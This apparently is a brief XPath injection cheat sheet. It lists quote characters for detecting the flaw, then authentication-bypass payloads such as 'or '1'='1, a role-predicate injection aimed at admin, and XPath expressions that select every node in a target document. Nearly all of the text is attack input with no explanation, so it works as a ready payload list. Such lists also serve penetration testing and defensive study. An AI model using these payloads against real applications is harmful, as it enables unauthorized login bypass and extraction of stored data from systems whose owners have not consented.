## Detection ##

' (Single Quote)
" (Double Quote)


## Exploitation ##

'or '1'='1
'or 1=1 or '='

]|*|user[@role='admin

"NODENAME"  (Return all children of node)
 
"//NODENAME" (Return all elements in the document)

"NODeNAME//SUBNODENAME"  (return all SUBNODE under NODE element)

"//NODENAME/[NAME="VALUE"     (value = admin)
